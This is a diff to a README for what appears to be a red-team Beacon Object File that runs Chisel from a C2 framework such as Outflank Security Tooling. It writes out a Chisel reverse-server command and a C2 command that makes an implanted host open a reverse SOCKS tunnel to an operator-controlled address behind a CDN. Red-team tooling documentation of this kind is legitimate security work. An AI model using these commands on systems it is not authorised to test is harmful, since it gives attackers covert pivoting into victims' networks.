@@ -13,21 +13,19 @@ Compile with Mingw64. `C:\path\to\mingw64\bin` must be in PATH. Then just run th
 build.bat
 ```
 
-## Run
-
-Outflank Security Tooling (OST), or any Beacon-family C2 with a BOF primitive: artifact
-`chiselbof.dll`, entry point `go`, then the server URL and the remote list.
+## Run from C2 (tested with OST)
 
 Chisel's flags are ordinary arguments, passed as **one** record holding the whole command line (dashes legal there because the payload splits it;
 `"` groups a value that contains a space):
 Server (behind CDN -> caddy or nginx server -> localhost:8000):
 ```
-chisel server --port 8000 --reverse -v --auth "ops:pass"
+chisel server --port 8000 --reverse -v --auth "username:password"
 ```
 OST or other C2:
 ```
-exec_bof_async z      "https://cdn.example.com R:1080:socks --auth username:pass  --max-retry-count 2"
+exec_bof_async z "https://cdn.example.com R:1080:socks --auth username:pass  --max-retry-count 2"
 ```
+Since the BOF runs continuously, the easiest way to stop it, is to use it with `--max-retry-count` and close the server. The BOF will then retry to connect to the server and, when it fails, it terminates the execution.
 
 ### Flags
 
